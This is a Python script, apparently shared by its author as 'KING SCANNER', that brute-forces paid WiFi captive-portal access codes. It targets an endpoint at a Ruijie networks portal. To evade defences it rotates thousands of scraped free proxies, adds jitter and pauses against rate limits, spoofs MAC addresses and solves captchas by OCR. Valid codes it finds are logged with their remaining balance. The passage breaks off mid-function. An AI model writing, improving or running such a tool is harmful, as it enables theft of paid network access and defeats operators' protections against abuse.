# ═══════════════════════════════════════════════════════════════════
#  ⚡  KING SCANNER — TERMINAL EDITION v9.4.3
#  🎯  AGGRESSIVE HIT · MEGA-FETCH · TERMUX ONLY
#  📡  PROXY MEGA-FETCH · ALL HITS SHOWN
#  👑  by @Mgblack400
# ═══════════════════════════════════════════════════════════════════

import asyncio, aiohttp, json, time, random, string, re, os, gc
import secrets as _secrets, datetime, threading, socket, sys, platform
from collections import deque
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse

_RNG = _secrets.SystemRandom()

_ORIG_GETADDRINFO = socket.getaddrinfo
_DNS_CACHE = {}

def _patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
    try:
        if isinstance(host, str) and host and host not in ('localhost', '127.0.0.1'):
            if host not in _DNS_CACHE:
                try: _DNS_CACHE[host] = socket.gethostbyname(host)
                except Exception: pass
            if host in _DNS_CACHE:
                return _ORIG_GETADDRINFO(_DNS_CACHE[host], port, family, type, proto, flags)
    except Exception: pass
    return _ORIG_GETADDRINFO(host, port, family, type, proto, flags)

socket.getaddrinfo = _patched_getaddrinfo

try:
    import ddddocr
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

from aiohttp_socks import ProxyConnector

try:
    import psutil; _PSUTIL = True
except ImportError:
    _PSUTIL = False

try:
    import uvloop; uvloop.install()
except ImportError:
    pass

def _is_replit():
    return bool(os.environ.get('REPL_ID') or os.environ.get('REPLIT_DB_URL')
                or os.environ.get('REPL_SLUG') or os.path.exists('/home/runner')
                or os.path.exists('/replit'))

_REPLIT_ENV = _is_replit()

PROXY_FILE = 'proxies.txt'
PROXY_BACKUP_DIR = 'proxies_backup'
PROXY_VALIDATED_FILE = 'proxies_validated.txt'
FILE_PATH = 'key.txt'
PORTAL_URL_PATH = 'portal_url_'
TERMINAL_USER_ID = 1

TIMEOUT_SEC = 6
MAX_CODES_PER_SESSION = 20
WORKERS_PER_PROXY = 12
STARTUP_STAGGER_MAX = 0.1
WORKER_JITTER_MS = 2

if _REPLIT_ENV:
    GLOBAL_REQ_CAP, GLOBAL_RPS_CAP = 800, 1500
    TCP_LIMIT_PER_HOST, TCP_LIMIT_TOTAL = 15, 200
    PER_PROXY_MAX, DIRECT_SLOTS = 2, 10
else:
    GLOBAL_REQ_CAP, GLOBAL_RPS_CAP = 2500, 5000
    TCP_LIMIT_PER_HOST, TCP_LIMIT_TOTAL = 40, 600
    PER_PROXY_MAX, DIRECT_SLOTS = 4, 20

BREATHING_MIN, BREATHING_MAX = 90, 240
BREATHING_DURATION = (1.0, 3.0)
TRIED_CODES_CAP = 5_000_000
VALID_CODES_CAP = 100_000
SID_TTL = 600
SID_POOL_MIN_RATIO = 0.08
SID_BATCH_SIZE_RATIO = 0.05
DIRECT = 'direct'

PROXY_FETCH_DEFAULT_LIMIT = 5000 if _REPLIT_ENV else 10000
PROXY_FETCH_MAX_LIMIT = 50000
PROXY_VALIDATE_CONCURRENT = 400 if _REPLIT_ENV else 1500
PROXY_VALIDATE_TIMEOUT = 5

SPEED_PRESETS = {
    'easy':   {'workers': 200,  'sem': 200},
    'normal': {'workers': 500,  'sem': 400},
    'high':   {'workers': 900,  'sem': 600},
    'ultra':  {'workers': 1400, 'sem': 800},
    'insane': {'workers': 2000, 'sem': 1100},
    'god':    {'workers': 2500, 'sem': 1300},
}
SID_PRESETS = {'small': 50, 'big': 200, 'sobig': 500, 'high': 1000, 'max': 2000}
DEFAULT_SPEED, DEFAULT_SID = 'ultra', 'big'

BLK='\x1b[30m'; BRED='\x1b[1;31m'; BGRN='\x1b[1;32m'; BYLW='\x1b[1;33m'
BBLU='\x1b[1;34m'; BMAG='\x1b[1;35m'; BCYN='\x1b[1;36m'; BWHT='\x1b[1;37m'
BG_RED='\x1b[41m'; BG_GRN='\x1b[42m'; BG_YLW='\x1b[43m'; BG_BLU='\x1b[44m'
BG_MAG='\x1b[45m'; BG_CYN='\x1b[46m'; DIM='\x1b[2m'; BLINK='\x1b[5m'; RST='\x1b[0m'

OWNER_NAME = "KING"

def clear_screen():
    try: sys.stdout.write('\033[2J\033[3H'); sys.stdout.flush()
    except Exception: pass

def hr(char='─', width=58, color=BCYN): return color + (char * width) + RST
def double_hr(color=BCYN, width=58): return color + ('═' * width) + RST

KING_LOGO_LINES = [
    "██╗  ██╗██╗███╗   ██╗ ██████╗ ",
    "██║ ██╔╝██║████╗  ██║██╔════╝ ",
    "█████╔╝ ██║██╔██╗ ██║██║  ███╗",
    "██╔═██╗ ██║██║╚██╗██║██║   ██║",
    "██║  ██╗██║██║ ╚████║╚██████╔╝",
    "╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ",
]
KING_COLORS = [BRED, BYLW, BGRN, BCYN, BBLU, BMAG]

def print_king_logo():
    for i, line in enumerate(KING_LOGO_LINES):
        print(f"     {KING_COLORS[i % len(KING_COLORS)]}{line}{RST}")

PROXY_SOURCES = {
    'socks5': [
        'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
        'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt',
    ],
    'socks4': [
        'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks4/data.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt',
    ],
    'http': [
        'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    ],
    'all': [
        'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/all/data.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
        'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt',
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    ],
}

_global_sem = None
_rps_window = deque(); _rps_lock = asyncio.Lock()
_next_breath = time.time() + random.uniform(BREATHING_MIN, BREATHING_MAX)
_working_endpoint = {}

def get_global_sem():
    global _global_sem
    if _global_sem is None: _global_sem = asyncio.Semaphore(GLOBAL_REQ_CAP)
    return _global_sem

def set_global_sem_limit(n):
    global _global_sem
    _global_sem = asyncio.Semaphore(min(n, GLOBAL_REQ_CAP))

async def rps_gate():
    while True:
        async with _rps_lock:
            now = time.time()
            while _rps_window and now - _rps_window[0] > 1.0: _rps_window.popleft()
            if len(_rps_window) < GLOBAL_RPS_CAP:
                _rps_window.append(now); return
            wait = 1.0 - (now - _rps_window[0])
        await asyncio.sleep(min(wait, 0.1) if wait > 0 else 0.005)

async def breathing_gate():
    global _next_breath
    if time.time() >= _next_breath:
        await asyncio.sleep(random.uniform(*BREATHING_DURATION))
        _next_breath = time.time() + random.uniform(BREATHING_MIN, BREATHING_MAX)

class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []; self.bad_proxies = set()
        self.cooldown = {}; self.concurrent = {}
        self.index = 0; self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy):
        proxy = (proxy or '').strip()
        if not proxy or proxy.startswith('#'): return None
        proxy = proxy.split()[0]
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return 'http://' + proxy
        return proxy

    def load(self):
        try:
            if os.path.exists(self.file_path):
                with open(self.file_path, 'r') as f: raw = f.read()
                self.proxies.clear(); self.bad_proxies.clear()
                self.cooldown.clear(); self.concurrent.clear(); self.index = 0
                seen = set()
                for r in raw.splitlines():
                    p = self._normalize(r)
                    if p and p not in seen:
                        seen.add(p); self.proxies.append(p)
                self.proxies.extend([DIRECT] * DIRECT_SLOTS)
        except Exception: pass

    def reload(self): self.load()

    def append_and_reload(self, new_proxies):
        try:
            existing = set()
            if os.path.exists(self.file_path):
                with open(self.file_path, 'r') as f:
                    for line in f.read().splitlines():
                        p = self._normalize(line)
                        if p: existing.add(p)
            added = 0
            with open(self.file_path, 'a') as f:
                for p in new_proxies:
                    np = self._normalize(p)
                    if np and np not in existing:
                        existing.add(np); f.write(np + '\n'); added += 1
            self.reload(); return added
        except Exception: return 0

    async def get_next(self):
        now = time.time()
        available = [p for p in self.proxies
                     if p not in self.bad_proxies
                     and self.cooldown.get(p, 0) <= now
                     and self.concurrent.get(p, 0) < PER_PROXY_MAX]
        if not available:
            available = [p for p in self.proxies
                         if p not in self.bad_proxies and self.cooldown.get(p, 0) <= now]
            if not available: return None
        proxy = _RNG.choice(available)
        self.index += 1
        self.concurrent[proxy] = self.concurrent.get(proxy, 0) + 1
        return proxy

    async def release(self, proxy):
        if proxy and proxy != DIRECT:
            self.concurrent[proxy] = max(0, self.concurrent.get(proxy, 0) - 1)

    async def mark_limited(self, proxy, seconds=30.0):
        if proxy == DIRECT: return
        async with self.lock: self.cooldown[proxy] = time.time() + seconds

    def stats(self):
        total = len(self.proxies); now = time.time()
        active = sum(1 for p in self.proxies
                     if p not in self.bad_proxies and self.cooldown.get(p, 0) <= now)
        return total, active

    def clear_dead(self):
        try:
            alive = [p for p in self.proxies if p != DIRECT and p not in self.bad_proxies]
            with open(self.file_path, 'w') as f:
                for p in alive: f.write(p + '\n')
            removed = len([p for p in self.proxies if p != DIRECT]) - len(alive)
            self.proxies = alive + [DIRECT] * DIRECT_SLOTS
            self.bad_proxies.clear(); self.cooldown.clear(); self.concurrent.clear()
            return removed
        except Exception: return 0

_proxy_manager = None

def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None: _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

async def validate_proxies(proxies, test_url='http://httpbin.org/ip',
                          timeout=None, max_concurrent=None):
    if not proxies: return [], []
    timeout = timeout or PROXY_VALIDATE_TIMEOUT
    max_concurrent = max_concurrent or PROXY_VALIDATE_CONCURRENT
    sem = asyncio.Semaphore(max_concurrent)

    async def test_one(p):
        async with sem:
            try:
                conn = ProxyConnector.from_url(p, ssl=False, limit=3, limit_per_host=3)
                async with aiohttp.ClientSession(connector=conn) as s:
                    async with s.get(test_url, timeout=timeout, ssl=False) as r:
                        if r.status < 500:
                            await r.read(); return (p, True)
            except Exception: pass
            return (p, False)

    results = await asyncio.gather(*[test_one(p) for p in proxies], return_exceptions=True)
    alive, dead = [], []
    for r in results:
        if isinstance(r, tuple):
            p, ok = r
            (alive if ok else dead).append(p)
    return alive, dead

def save_proxies_to_backup(proxies, tag='fetched'):
    try:
        os.makedirs(PROXY_BACKUP_DIR, exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        fname = os.path.join(PROXY_BACKUP_DIR, f'{tag}_{ts}.txt')
        with open(fname, 'w') as f:
            for p in proxies: f.write(p + '\n')
        return fname
    except Exception: return None

def save_validated_proxies(proxies):
    try:
        existing = set()
        if os.path.exists(PROXY_VALIDATED_FILE):
            with open(PROXY_VALIDATED_FILE, 'r') as f:
                for line in f.read().splitlines():
                    if line.strip(): existing.add(line.strip())
        new_added = 0
        with open(PROXY_VALIDATED_FILE, 'a') as f:
            for p in proxies:
                if p not in existing:
                    f.write(p + '\n'); existing.add(p); new_added += 1
        return new_added
    except Exception: return 0

def _clean_proxy_lines(text, proto):
    out, seen = [], set()
    prefix = {'socks5': 'socks5://', 'socks4': 'socks4://',
              'http': 'http://', 'all': ''}.get(proto, '')
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith(('#', '//')): continue
        p = line.split()[0].strip()
        if not p: continue
        if not p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$', p):
                p = (prefix or 'http://') + p
            elif '@' in p and ':' in p:
                p = (prefix or 'http://') + p
            else: continue
        if not re.match(r'^(https?|socks[45])://[^\s]+:\d+', p): continue
        if p in seen: continue
        seen.add(p); out.append(p)
    return out

async def _fetch_one_source(session, url, proto, timeout=25):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as r:
            if r.status != 200: return []
            return _clean_proxy_lines(await r.text(), proto)
    except Exception: return []

async def fetch_online_proxies(protocol='all', limit=None, auto_validate=True):
    pm = get_proxy_manager()
    limit = min(int(limit or PROXY_FETCH_DEFAULT_LIMIT), PROXY_FETCH_MAX_LIMIT)
    sources = PROXY_SOURCES.get(protocol, PROXY_SOURCES['all'])
    print(BCYN + f'📡 Mega-fetch: {protocol} — {len(sources)} sources, target ≤ {limit}' + RST)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'}
    all_proxies, seen = [], set()
    try:
        async with aiohttp.ClientSession(headers=headers) as s:
            tasks = [asyncio.create_task(_fetch_one_source(s, url, protocol)) for url in sources]
            for t in asyncio.as_completed(tasks):
                try:
                    for p in await t:
                        if p not in seen: seen.add(p); all_proxies.append(p)
                except Exception: pass
    except Exception as e:
        print(BRED + f'[mega-fetch] {e}' + RST)
    print(BCYN + f'📥 Raw collected: {len(all_proxies)}' + RST)
    if not all_proxies: return 0, None, 'No proxies fetched'
    if limit > 0 and len(all_proxies) > limit:
        all_proxies = _RNG.sample(all_proxies, limit)
        print(BCYN + f'🎯 Random sample {limit}' + RST)
    save_proxies_to_backup(all_proxies, tag=f'raw_{protocol}')
    if not auto_validate:
        added = pm.append_and_reload(all_proxies)
        return added, f'mega/{protocol}', None
    print(BCYN + f'🧪 Validating {len(all_proxies)}...' + RST)
    alive, dead = await validate_proxies(all_proxies)
    print(BGRN + f'✅ {len(alive)} alive / ❌ {len(dead)} dead' + RST)
    if alive:
        save_proxies_to_backup(alive, tag=f'valid_{protocol}')
        save_validated_proxies(alive)
        added = pm.append_and_reload(alive)
        return added, f'mega/{protocol} ({len(sources)} sources)', None
    return 0, f'mega/{protocol}', 'All failed validation'

_ocr_instance = None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None and _HAS_OCR:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

user_scanners = {}

def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        if os.path.exists(FILE_PATH):
            try:
                with open(FILE_PATH, 'r') as f:
                    for line in f.read().strip().splitlines():
                        if line.startswith(PORTAL_URL_PATH + str(user_id) + ' '):
                            saved_url = line.split(' ', 1)[1].strip(); break
            except Exception: pass
        user_scanners[user_id] = {
            'mode': 'num6', 'char_set': '012345678', 'code_len': 6,
            'start_digit': None, 'end_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'sid_event': asyncio.Event(),
            'task': None,
            'stats': {'tried': 0, 'hits': 0, 'wrong': 0, 'expired': 0,
                      'limits': 0, 'failed': 0, 'start_time': time.time()},
            'valid_codes': [], 'tried_codes': set(),
            'recent_logs': [], 'CURRENT_CODE': '----',
            'sid_pool': [], 'sid_time': {}, 'sid_auth': {},
            'sid_lock': asyncio.Lock(), 'sid_sem': {}, 'sid_created': 0,
            '_last_cleanup': time.time(),
            'speed_preset': DEFAULT_SPEED, 'sid_preset': DEFAULT_SID,
            'worker_target': SPEED_PRESETS[DEFAULT_SPEED]['workers'],
            'sid_target': SID_PRESETS[DEFAULT_SID],
            'worker_dict': {}, 'worker_counter': 0,
            'per_proxy_fails': {}, 'proxy_banned_until': {},
        }
    return user_scanners[user_id]

def generate_random_mac():
    return ':'.join('%02x' % _RNG.randint(0, 255) for _ in range(6))

def ocr_image_bytes_fast(image_bytes):
    if not _HAS_OCR: return ''
    try:
        return get_ocr_instance().classification(image_bytes).strip().upper()
    except Exception: return ''

async def solve_captcha_simple_async(session, captcha_url, headers):
    if not _HAS_OCR: return ''
    url = f"{captcha_url}&_t={int(time.time() * 1000)}"
    try:
        async with session.get(url, headers=headers, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=6)) as r:
            if r.status == 200:
                return await asyncio.to_thread(ocr_image_bytes_fast, await r.read())
    except Exception: pass
    return ''

_SID_PATTERNS = [
    r'"sessionId"\s*:\s*"([A-Za-z0-9_-]{6,})"',
    r'"session_id"\s*:\s*"([A-Za-z0-9_-]{6,})"',
    r'"sid"\s*:\s*"([A-Za-z0-9_-]{6,})"',
    r"sessionId\s*=\s*['\"]([A-Za-z0-9_-]{6,})['\"]",
    r"[?&]sessionId=([A-Za-z0-9_-]{6,})",
]

def _extract_sid_from_text(text):
    if not text: return None
    for pat in _SID_PATTERNS:
        m = re.search(pat, text, re.I)
        if m: return m.group(1)
    return None

def _extract_sid_from_cookies(cookie_jar):
    try:
        for c in cookie_jar:
            if c.key.lower() in ('sessionid', 'session_id', 'sid', 'jsessionid'):
                if c.value and len(c.value) > 5: return c.value
    except Exception: pass
    return None

def _extract_sid_from_json(data):
    if not isinstance(data, dict): return None
    for k in ('sessionId', 'session_id', 'sid', 'SessionId'):
        v = data.get(k)
        if isinstance(v, str) and len(v) > 5: return v
        if isinstance(v, dict):
            inner = _extract_sid_from_json(v)
            if inner: return inner
    for v in data.values():
        if isinstance(v, dict):
            inner = _extract_sid_from_json(v)
            if inner: return inner
        if isinstance(v, list):
            for item in v:
                if isinstance(item, dict):
                    inner = _extract_sid_from_json(item)
                    if inner: return inner
    return None

async def _try_get_sid(session, url, headers):
    try:
        async with session.get(url, headers=headers, timeout=TIMEOUT_SEC,
                               ssl=False, allow_redirects=True) as r:
            sid = parse_qs(urlparse(str(r.url)).query).get('sessionId', [None])[0]
            if sid: return sid
            sid = _extract_sid_from_cookies(session.cookie_jar)
            if sid: return sid
            body = await r.text()
            sid = _extract_sid_from_text(body)
            if sid: return sid
            try:
                data = json.loads(body)
                return _extract_sid_from_json(data)
            except Exception: pass
    except Exception: pass
    return None

async def get_sid_from_gateway(session, portal_url, user_id):
    existing = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
    if existing and len(existing) > 5: return existing, 'url_query'
    parsed = urlparse(portal_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
    headers_mobile = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    headers_json = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': base,
        'Referer': f'{base}/download/static/maccauth/src/index.html',
    }
    sid = await _try_get_sid(session, portal_url, headers_mobile)
    if sid: return sid, 'portal_get'
    if 'mac' in params:
        try:
            q2 = dict(params); q2['mac'] = generate_random_mac()
            u2 = urlunparse(parsed._replace(query=urlencode(q2)))
            sid = await _try_get_sid(session, u2, headers_mobile)
            if sid: return sid, 'portal_mac'
        except Exception: pass
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    sid = await _try_get_sid(session, base_url, headers_mobile)
    if sid: return sid, 'base_path'
    init_paths = [
        '/api/auth/session/init', '/api/auth/session',
        '/api/auth/wifidog/init', '/api/auth/getSessionId',
        '/api/auth/createSession', '/api/auth/portal', '/api/auth/init',
    ]
    for path in init_paths:
        try:
            async with session.post(f'{base}{path}', json=params, headers=headers_json,
                                    timeout=TIMEOUT_SEC, ssl=False, allow_redirects=True) as r:
                sid = _extract_sid_from_cookies(session.cookie_jar)
                if sid: return sid, f'post{path}'
                try:
                    sid = _extract_sid_from_json(await r.json())
                    if sid: return sid, f'post{path}'
                except Exception: pass
        except Exception: pass
    return None, None

def create_connector_for_proxy(proxy):
    if proxy and proxy != DIRECT:
        return ProxyConnector.from_url(proxy, ssl=False,
                                       limit=TCP_LIMIT_PER_HOST,
                                       limit_per_host=TCP_LIMIT_PER_HOST)
    return aiohttp.TCPConnector(limit=TCP_LIMIT_TOTAL, limit_per_host=TCP_LIMIT_PER_HOST,
                                ssl=False, ttl_dns_cache=300,
                                enable_cleanup_closed=True, keepalive_timeout=45)

async def fetch_balance(logon_url, code, proxy, orig_sid=None, balance_base=None):
    candidates = []
    if logon_url:
        m = re.search(r'sessionId=([^&\s]+)', logon_url)
        if m: candidates.append(m.group(1))
    if orig_sid and orig_sid not in candidates: candidates.append(orig_sid)
    if not candidates: candidates.append(code)
    if not balance_base:
        balance_base = 'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance'
    connector = create_connector_for_proxy(proxy)
    try:
        async with aiohttp.ClientSession(connector=connector) as s:
            for target in candidates:
                headers = {
                    'accept': 'application/json, */*; q=0.01',
                    'content-type': 'application/json;',
                    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                for url_tpl in (f'{balance_base}/{target}', f'{balance_base}?sessionId={target}'):
                    try:
                        async with s.get(url_tpl, headers=headers, timeout=6) as resp:
                            if resp.status != 200: continue
                            try: data = await resp.json()
                            except Exception: continue
                            inner = data.get('result') or data.get('data') or data
                            if not isinstance(inner, dict): continue
                            profile = (inner.get('profileName') or inner.get('username')
                                       or inner.get('plan') or 'N/A')
                            raw_min = (inner.get('totalMinutes') or inner.get('minutes')
                                       or inner.get('balance') or 0)
                            try: total_min = int(raw_min)
                            except Exception: total_min = 0
                            if (not profile or profile == 'N/A') and total_min <= 0: continue
                            h, m = divmod(total_min, 60)
                            return f"🃏: {profile}, ⏰: {h} hr {m} min"
                    except Exception: continue
    except Exception: pass
    return "--"

async def check_balance(logon_url, code, user_id, proxy_str, orig_sid=None, balance_base=None):
    ud = get_user_data(user_id)
    try:
        bs = await asyncio.wait_for(fetch_balance(logon_url, code, proxy_str, orig_sid, balance_base), timeout=12)
    except Exception: bs = "--"
    for item in ud['valid_codes']:
        if item['code'] == code: item['balance_str'] = bs; break
    ud['dash_update_event'].set()
    return bs

def _deep_search_hit(data, depth=0, _context=None):
    if depth > 15 or not isinstance(data, dict): return None
    if _context is None:
        _context = {'logon_url': '', 'profile': '', 'total_min': 0,
                    'auth_result': None, 'welcome': ''}
    URL_KEYS = {'logonurl', 'loginurl', 'redirecturl', 'redirect', 'url', 'location', 'href'}
    PROFILE_KEYS = {'profilename', 'profile', 'username', 'plan', 'planname', 'package'}
    MIN_KEYS = {'totalminutes', 'minutes', 'remainminutes', 'balance', 'duration'}
    AUTH_KEYS = {'authresult', 'authresultcode', 'resultcode'}
    WELCOME_KEYS = {'welcomemsg', 'successmsg', 'welcome'}
    for key, val in data.items():
        if not isinstance(key, str): continue
        kl = key.lower().replace(' ', '').replace('_', '').replace('-', '')
        if kl in {k.replace('_', '').replace('-', '') for k in AUTH_KEYS}:
            if _context['auth_result'] is None: _context['auth_result'] = val
            continue
        if kl in {k.replace('_', '').replace('-', '') for k in URL_KEYS}:
            if isinstance(val, str) and val.strip() and not _context['logon_url']:
                _context['logon_url'] = val.strip()
            continue
        if kl in {k.replace('_', '').replace('-', '') for k in PROFILE_KEYS}:
            if isinstance(val, (str, int)) and val and not _context['profile']:
                s = str(val).strip()
                if s and not s.startswith(('http', '/')): _context['profile'] = s
            continue
        if kl in {k.replace('_', '').replace('-', '') for k in MIN_KEYS}:
            try:
                v = int(val or 0)
                if v > _context['total_min']: _context['total_min'] = v
            except (ValueError, TypeError): pass
            continue
        if kl in {k.replace('_', '').replace('-', '') for k in WELCOME_KEYS}:
            if isinstance(val, str) and val.strip() and not _context['welcome']:
                _context['welcome'] = val.strip()
            continue
    for val in data.values():
        if isinstance(val, dict): _deep_search_hit(val, depth + 1, _context)
        elif isinstance(val, list):
            for item in val:
                if isinstance(item, dict): _deep_search_hit(item, depth + 1, _context)
    if depth != 0: return None
    is_hit = False; reasons = []
    ar = _context['auth_result']
    if ar is not None:
        ar_str = str(ar).strip().lower()
        if ar_str in ('1', 'true', 'yes', 'success', 'ok'):
            is_hit = True; reasons.append(f'authResult={ar}')
    lu = _context['logon_url']
    if lu and len(lu) > 15:
        lu_low = lu.lower()
        if ('sessionid' in lu_low or 'http' in lu_low or 'logon' in lu_low or 'portal' in lu_low):
            ar_str = str(ar).strip().lower() if ar is not None else ''
            if ar_str not in ('2', '-1', 'false', 'expired', 'fail', 'error'):
                is_hit = True; reasons.append('logonUrl')
    if _context['profile'] and _context['total_min'] > 0:
        is_hit = True; reasons.append('profile+min')
    if not is_hit: return None
    return {'is_hit': True, 'logon_url': _context['logon_url'],
            'profile': _context['profile'], 'total_min': _context['total_min'],
            'auth_result': _context['auth_result'], 'reason': ' | '.join(reasons)}

def classify_response(data, raw_text=''):
    if data is None: return ('error', None)
    if isinstance(data, str):
        t = data.lower()
        if not t.strip(): return ('error', None)
        if '<!doctype' in t or '<html' in t: return ('error', None)
        if any(x in t for x in ('limit', 'exceed', 'too many', 'frequency', 'rate limit')):
            return ('limit', None)
        if any(x in t for x in ('expired', 'no longer valid')): return ('expired', None)
        try:
            start = data.find('{'); end = data.rfind('}') + 1
            if start >= 0 and end > start: data = json.loads(data[start:end])
        except Exception: return ('wrong', None)
    if not isinstance(data, dict): return ('wrong', None)
    if not data: return ('error', None)
    hit_info = _deep_search_hit(data, 0, None)
    if hit_info and hit_info['is_hit']: return ('hit', hit_info)
    for c in (data, data.get('object'), data.get('result'), data.get('data')):
        if isinstance(c, dict) and c.get('checkCaptcha'): return ('captcha', None)
    ar_val = None
    def find_ar(d):
        nonlocal ar_val
        if not isinstance(d, dict): return
        for k, v in d.items():
            if isinstance(k, str) and k.lower().replace('_','').replace(' ','') in (
                'authresult', 'authresultcode', 'resultcode'):
                if ar_val is None: ar_val = v; return
            if isinstance(v, dict): find_ar(v)
            elif isinstance(v, list):
                for item in v:
                    if isinstance(item, dict): find_ar(item)
    find_ar(data)
    if ar_val is not None:
        ar_str = str(ar_val).strip().lower()
        if ar_str == '2': return ('expired', None)
        if ar_str == '-1': return ('error', None)
        return ('wrong', None)
    success = data.get('success')
    if success is False or success == 0: return ('wrong', None)
    if success is True or success == 1: return ('expired', None)
    msgs = []
    for k in ('message', 'msg', 'error', 'info', 'reason', 'detail'):
        v = data.get(k)
        if v: msgs.append(str(v).lower())
    all_msg = ' '.join(msgs)
    if any(x in all_msg for x in ('limit', 'exceed', 'too many', 'frequency')):
        return ('limit', None)
    if any(x in all_msg for x in ('expired', 'out of date')): return ('expired', None)
    if any(x in all_msg for x in ('not found', 'invalid', 'wrong', 'fail', 'error')):
        return ('wrong', None)
    return ('wrong', None)

async def check_single_access_code(session, code, current_session_id, login_url,
                                    captcha_base_url, verify_url, headers, user_id,
                                    current_proxy, auth_code=None, balance_base=None):
    ud = get_user_data(user_id)

    async def submit(endpoint, ac=None):
        payload = {'accessCode': code, 'apiVersion': 1}
        if current_session_id: payload['sessionId'] = current_session_id
        if ac: payload['authCode'] = ac
        try:
            async with session.post(endpoint, json=payload, headers=headers, ssl=False,
                                    timeout=aiohttp.ClientTimeout(total=8)) as resp:
                try: return (resp.status, 'json', await resp.json())
                except Exception:
                    try: return (resp.status, 'text', await resp.text())
                    except Exception: return (resp.status, 'text', '')
        except asyncio.TimeoutError: return (0, 'timeout', None)
        except Exception: return (0, 'err', None)

    status, kind, data = await submit(login_url)
    if kind in ('timeout', 'err'):
        ud['stats']['failed'] += 1
        return {'status': 'net_fail', 'network': True, 'code': code}
    classification, hit_info = classify_response(data, data if isinstance(data, str) else '')
    if classification == 'hit':
        ud['stats']['hits'] += 1
        hit = {'code': code, 'balance_str': '...fetching...', 'time': time.time()}
        ud['valid_codes'].append(hit)
        if len(ud['valid_codes']) > VALID_CODES_CAP:
            ud['valid_codes'] = ud['valid_codes'][-VALID_CODES_CAP:]
        ud['dash_update_event'].set()
        logon = (hit_info or {}).get('logon_url') or ''
        asyncio.create_task(check_balance(logon, code, user_id, current_proxy,
                                          current_session_id, balance_base))
        return {'status': 'hit', 'code': code, 'auth_code': auth_code}
    if classification == 'captcha':
        if not current_session_id or not _HAS_OCR:
            ud['stats']['wrong'] += 1
            return {'status': 'wrong', 'code': code}
        captcha_url = captcha_base_url + '?sessionId=' + current_session_id
        for _ in range(2):
            new_code = await solve_captcha_simple_async(session, captcha_url, headers)
            if not new_code: continue
            try:
                async with session.post(verify_url,
                                        json={'sessionId': current_session_id, 'authCode': new_code},
                                        headers=headers, ssl=False,
                                        timeout=aiohttp.ClientTimeout(total=8)) as v_resp:
                    v_data = await v_resp.json()
            except Exception: v_data = {}
            if not (isinstance(v_data, dict) and v_data.get('success')): continue
            s3, k3, d3 = await submit(login_url, new_code)
            c3, h3 = classify_response(d3, d3 if isinstance(d3, str) else '')
            if c3 == 'hit':
                ud['stats']['hits'] += 1
                hit = {'code': code, 'balance_str': '...fetching...', 'time': time.time()}
